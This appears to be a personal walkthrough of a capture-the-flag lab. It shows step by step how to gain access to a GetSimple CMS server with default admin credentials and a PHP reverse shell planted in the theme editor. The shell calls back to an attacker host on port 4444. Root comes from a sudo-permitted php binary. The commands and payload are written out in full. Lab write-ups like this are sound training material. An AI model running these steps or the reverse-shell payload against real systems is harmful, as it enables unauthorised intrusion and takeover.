### Gaining a foot hold of the target
1.first step is scanned the target machine  with nmap to find vulnerabilities
2.i found port 22 and port 80 are open
3.attacked port 80 using gobuster to find all the directories
gobuster dir -u http://10.129.71.80 -w /usr/share/wordlists/dirb/common.txt
4.i found i found http://10.129.42.249/admin/
5.now i need to find the credentials
6.i found the username "admin" being mentioned alot in different directories
7.tried common passwords like password and admin, i got lucky the password is admin
8.sing into the admin login page
9.started looking at vulnerable frameworks that they might be using that could support remote code execution
10.i ran whatweb for that
11.whatweb http://10.129.71.80
whatweb scans a website and tries to identify what services are used
it returns two services Apache 2.4.41 on Ubuntu and GetSimple CMS
12.Apache does not have any known remote code execution vulnerabilities, so i searched getsimple for some remote execution vulerabilities since its what the lab wants me to do
13.i can either use google to search for vulnerabilities or use searchsploit
14.you can use the search command in metasploitable to find all the available exploits
like this search getsimple
15.use exploit/unix/webapp/get_simple_cms_upload_exec
16.ok now use google to search what this exploit does
17.i learn that it is a php attack, from here on forward i will do the attack manually
18.i search what that exploit means on the internet
19.i learn that it is a php attack
20.i log into the admin tab
21.i go into theme tab> go into edit
22.and get a php rever shell from GTFOBins.com
23.<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.236/4444 0>&1'"); ?>(its a reverse shell)
24.paste into the theme tab editor
25.click save
26.start your listener on a terminal
nc -nvlp 4444
27.trigger the connection by visiting http://10.129.42.249/theme/Innovation/template.php
28.upgrade the shell python3 -c 'import pty;pty.spawn("/bin/bash");'
29.format the shell export TERM=xterm
30.cd to the Linux machine cd home
31.run ls
32.notice there is a user mrb3n
33.cd there
34.cat user.txt to read it
#### question 2: After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.
1.you must have a reverse shell initiated, so you can follow the steps above
2.run the sudo l command to check what you can run as admin
3.look at the (ALL : ALL) NOPASSWD: /usr/bin/php
4.that tells us that php can be runned as root/admin without a password
5.go to gtfobins search for a php command that will prompt a shell as admin
6.run the gtfobins command as root sudo php -r "system('/bin/bash');"
7.after running this command you will notice your prompts changes to display adming or # which means you are admin in Linux
8.since you are deep into root you will need to run cat /root/root.txt
-or run cd /root and then read root.txt from there